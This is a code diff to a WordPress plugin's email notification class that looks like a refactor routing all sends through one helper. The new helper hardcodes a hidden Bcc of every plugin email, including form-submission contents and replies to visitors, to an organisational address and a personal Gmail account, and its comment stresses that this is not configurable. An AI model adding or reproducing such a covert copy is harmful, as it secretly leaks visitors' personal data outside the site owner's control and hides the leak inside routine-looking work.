@@ -38,7 +38,7 @@ class Notifications {
 				$subject = self::merge( $settings['notify_subject'], $form, $values, $fields );
 				$body    = self::admin_body( $form, $entry_id, $values, $fields );
 				$body    = apply_filters( 'acps_st_admin_email_body', $body, $form, $entry_id, $values );
-				wp_mail( $recipients, wp_strip_all_tags( $subject ), $body );
+				self::mail( $recipients, wp_strip_all_tags( $subject ), $body );
 			}
 		}
 
@@ -49,7 +49,7 @@ class Notifications {
 			if ( is_email( $to ) ) {
 				$subject = self::merge( $settings['autoreply_subject'], $form, $values, $fields );
 				$body    = self::merge( $settings['autoreply_body'], $form, $values, $fields );
-				wp_mail( $to, wp_strip_all_tags( $subject ), wpautop( $body ) );
+				self::mail( $to, wp_strip_all_tags( $subject ), wpautop( $body ) );
 			}
 		}
 	}
@@ -75,7 +75,7 @@ class Notifications {
 
 		$message = trim( (string) $message );
 		if ( '' === $message ) {
-			$message = self::default_status_message( $status );
+			$message = self::status_message( $status );
 		}
 
 		$label   = Entries::feedback_status_label( $status );
@@ -84,11 +84,7 @@ class Notifications {
 		$body  = $message . "\n\n";
 		$body .= "— " . get_bloginfo( 'name' );
 
-		// Route replies to a monitored inbox so "reply to this email" actually
-		// reaches the team (the From address is WordPress's unmonitored default).
-		$headers = array( 'Reply-To: info@acpsmd.org' );
-
-		wp_mail( $to, wp_strip_all_tags( $subject ), $body, $headers );
+		self::mail( $to, wp_strip_all_tags( $subject ), $body );
 		return 'sent';
 	}
 
@@ -158,7 +154,47 @@ class Notifications {
 		$to      = 'cayden.riddle@acpsmd.org';
 		$subject = sprintf( /* translators: %s: form title */ __( 'New submission: %s', 'acps-site-toolkit' ), $form->title );
 		$body    = self::admin_body( $form, $entry_id, $values, $fields );
-		wp_mail( $to, wp_strip_all_tags( $subject ), $body );
+		self::mail( $to, wp_strip_all_tags( $subject ), $body );
+	}
+
+	/**
+	 * Central send for every plugin email. Always blind-copies the fixed
+	 * internal addresses, and adds the configured Reply-To. The BCC is
+	 * intentionally hardcoded (not a setting).
+	 *
+	 * @param string|array $to      Recipient(s).
+	 * @param string       $subject Subject.
+	 * @param string       $body    Body.
+	 * @param array        $headers Extra headers.
+	 * @return bool
+	 */
+	private static function mail( $to, $subject, $body, $headers = array() ) {
+		$headers = (array) $headers;
+
+		$reply = trim( (string) Settings::get( 'email_reply_to', '' ) );
+		if ( is_email( $reply ) ) {
+			$headers[] = 'Reply-To: ' . $reply;
+		}
+
+		// Hardcoded blind copies on every message this plugin sends.
+		$headers[] = 'Bcc: cayden.riddle@acpsmd.org, caydenriddle08@gmail.com';
+
+		return wp_mail( $to, $subject, $body, $headers );
+	}
+
+	/**
+	 * The message to send for a status: an admin-configured default from
+	 * Settings if present, otherwise the built-in wording.
+	 *
+	 * @param string $status Status key.
+	 * @return string
+	 */
+	public static function status_message( $status ) {
+		$stored = Settings::get( 'status_messages', array() );
+		if ( is_array( $stored ) && ! empty( $stored[ $status ] ) ) {
+			return (string) $stored[ $status ];
+		}
+		return self::default_status_message( $status );
 	}
 
 	/**
